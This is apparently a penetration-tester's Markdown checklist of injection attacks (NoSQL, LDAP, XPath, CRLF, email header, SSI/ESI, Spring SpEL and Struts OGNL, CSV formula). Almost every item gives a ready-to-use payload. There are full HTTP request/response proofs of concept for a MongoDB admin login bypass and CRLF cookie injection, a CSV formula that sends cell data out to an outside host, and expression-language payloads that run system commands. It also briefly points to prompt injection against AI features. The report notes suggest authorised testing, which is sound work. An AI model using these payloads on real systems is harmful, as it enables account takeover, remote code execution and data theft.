# NoSQL & Misc Injection

## NoSQL injection (MongoDB etc.)
**Where:** login, search, filters that build queries from JSON.
- [ ] Auth bypass: `{"user":"admin","pass":{"$ne":null}}` / `{"$gt":""}`.
- [ ] Operator injection in query params: `user[$ne]=x&pass[$ne]=x`.
- [ ] Regex extraction: `{"pass":{"$regex":"^a"}}` → blind char-by-char.
- [ ] JS eval: `{"$where":"sleep(5000)"}` (time-based).
- Tools: `nosqlmap`, manual.

## LDAP injection
**Where:** login/search against directory.
- [ ] `*)(uid=*))(|(uid=*` , `*)(|(password=*))` → auth bypass / enumerate.

## Host header injection — full file: `09-advanced/09-host-header-injection.md`
- [ ] Poison password-reset link (`Host:` → attacker domain in reset email).
- [ ] Cache poisoning via `X-Forwarded-Host`, `X-Forwarded-Server`.
- [ ] Routing/SSRF via absolute-URI + `Host` mismatch.

## CRLF / HTTP response splitting
- [ ] Inject `%0d%0a` into redirect/header-reflected params → add headers, set cookies, split response, XSS.
- Tool: `~/scripts` smuggler (CRLF module).

## XPath / XQuery injection
- [ ] `' or '1'='1`, `']|//user/*|//foo['` in XML-backed search/login.

## Email header injection
- [ ] `%0aBcc: attacker@x.com` into contact/forgot forms → send mail as the app.

## SSI / ESI injection
- [ ] SSI: `<!--#exec cmd="id"-->`. ESI: `<esi:include src=http://collab/>` (edge-side, SSRF/XSS).

## 🎯 PoC — Request → Response

**NoSQL auth bypass (`$ne` operator in JSON login):**
```http
POST /api/v1/auth/login HTTP/2
Host: api.target.com
Content-Type: application/json

{"email":"admin@target.com","password":{"$ne":null}}
```
```http
HTTP/2 200 OK
Set-Cookie: session=eyJ...; HttpOnly; Secure
Content-Type: application/json

{"token":"eyJ...","user":{"email":"admin@target.com","role":"admin"}}
```
`{"$ne":null}` matches any password → logged in as admin without credentials.

**CRLF header injection (reflected redirect param):**
```http
GET /redirect?next=/home%0d%0aSet-Cookie:%20sess=attacker HTTP/2
Host: target.com
```
```http
HTTP/2 302 Found
Location: /home
Set-Cookie: sess=attacker           ← injected header
```

## Expression-language & server-side eval injection
- [ ] **Spring SpEL:** `T(java.lang.Runtime).getRuntime().exec('id')` in `spring.expression`, `#{}` fields, Spring Cloud Gateway/`Eureka`; **CVE-class RCE**.
- [ ] **OGNL (Struts2):** `%{(#_='multipart/form-data').(#cmd='id')...}` — the classic Struts RCE family (S2-045/057).
- [ ] **MVEL/JEXL/EL (`${}`)** in Java apps, Groovy `Eval`, JavaScript `vm.runInContext`/`eval` in Node.
- [ ] **Ruby `.constantize`/`send`**, Python `eval`/`exec`/`__import__`, PHP `assert`/`create_function`/`preg_replace /e`.

## NoSQL — blind extraction & more engines
- [ ] **Blind boolean/regex extraction (Mongo):** loop `{"pass":{"$regex":"^a.*"}}` … `^ab.*` to recover secrets char-by-char (automate with a script; anti-ban like `~/scripts/sqli_hunter.py`).
- [ ] **`$where`/`mapReduce`/`$function` JS eval:** `{"$where":"this.pass.match(/^a/)"}` → boolean; time via `sleep()`.
- [ ] **Operator injection via query string:** `user[$ne]=1&pass[$gt]=`, `role[$in][]=admin`, `user[$exists]=true&pass[$exists]=true`; array/object body flips a string compare.
- [ ] **Regex-length oracle:** `user[$regex]=.{25}&pass[$ne]=1` — vary the count to leak field lengths before extracting chars.
- [ ] **GraphQL/JSON → Mongo:** filters passed straight into `find()` (Prisma/Mongoose) accept operators.
- [ ] **CouchDB/Elasticsearch/Redis:** `_all_docs`, `_search` query injection, Redis Lua `EVAL`, CouchDB `_config`/`_users` (RCE CVE-2017-12635/12636).

## CRLF, request splitting & smuggling adjacency
- [ ] `%0d%0a` (and `%E5%98%8A%E5%98%8D` unicode-CRLF) into redirect/header-reflected params → inject `Set-Cookie`, `Location`, split body → XSS, **cache poisoning** (`08-infra/03`), or session fixation.
- [ ] CRLF in the request line/headers you control that reaches an upstream → **request smuggling** (`08-infra/02`, `10-server-edge/02`).

## Email / SMTP header injection & smuggling
- [ ] `%0aBcc:`, `%0aTo:`, `%0aContent-Type:` into contact/reset/invite forms → send mail as the app, alter recipients, inject body/attachments.
- [ ] **SMTP smuggling** (2024): `\r\n.\r\n` desync between sending and receiving MTA → spoof DMARC-passing mail from the target domain.

## SSI / ESI (edge-side)
- [ ] SSI: `<!--#exec cmd="id"-->`, `<!--#include virtual=>`. ESI (Varnish/Akamai/Fastly/Oracle): `<esi:include src=http://collab/>` → SSRF/XSS/cache abuse; `<esi:vars>` leaks `$(HTTP_COOKIE)`.

## XPath / XQuery / LDAP — blind extraction
- [ ] XPath blind: `... and substring(//user[1]/password,1,1)='a'` → boolean char-by-char.
- [ ] LDAP blind: `*)(uid=a*)` truthiness to enumerate; wildcard `*` to dump.

## CSV / formula injection (exports)
- [ ] Values starting `= + - @` (or `\t`/`\r` prefixes) in fields that get exported to CSV/XLSX → `=cmd|'/c calc'!A1`, `=HYPERLINK("http://collab?"&A1)` for exfil when the victim opens the export. See `06-file-upload/03`.

## LLM/prompt injection
- [ ] If any field feeds an AI feature, treat it as an injection sink → `11-ai-llm/01`.

## Report notes
Each: minimal proof (auth bypass shown once, OOB hit, or benign extraction). No mass extraction. Name the sink (EL/OGNL/Mongo `$where`/CRLF/CSV) precisely.
